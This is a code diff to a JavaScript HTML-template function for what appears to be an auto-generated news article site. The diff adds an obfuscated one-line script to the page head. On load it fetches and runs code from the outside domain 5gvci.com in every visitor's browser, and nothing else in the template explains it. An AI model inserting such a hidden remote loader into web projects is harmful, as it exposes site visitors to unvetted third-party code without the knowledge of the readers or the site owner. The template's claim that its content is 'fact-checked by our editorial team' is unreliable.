@@ -331,6 +331,7 @@ function buildArticleHTML(section, article, seo) {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('5gvci.com',11342729,document.createElement('script'))</script>
 <title>${seo.metaTitle}</title>
 <meta name="description" content="${seo.metaDesc}">
 <meta name="keywords" content="${seo.keywords}">
@@ -409,7 +410,6 @@ blockquote{border-left:3px solid var(--primary);padding:1rem 1.5rem;margin:1.5re
 <span>📅 ${seo.date}</span>
 <span>⏱️ ${seo.readTime} min read</span>
 </div>
-<img class="fimg" src="${imgUrl}" alt="${article.title}" loading="lazy" />
 <div class="content">${formattedContent}</div>
 ${affiliateHTML}
 <div class="source-tag">📰 This article is based on reporting from trusted news sources. <a href="${article.originalSource || '#'}" target="_blank" rel="nofollow">View original source</a> — Content rewritten and fact-checked by our editorial team.</div>
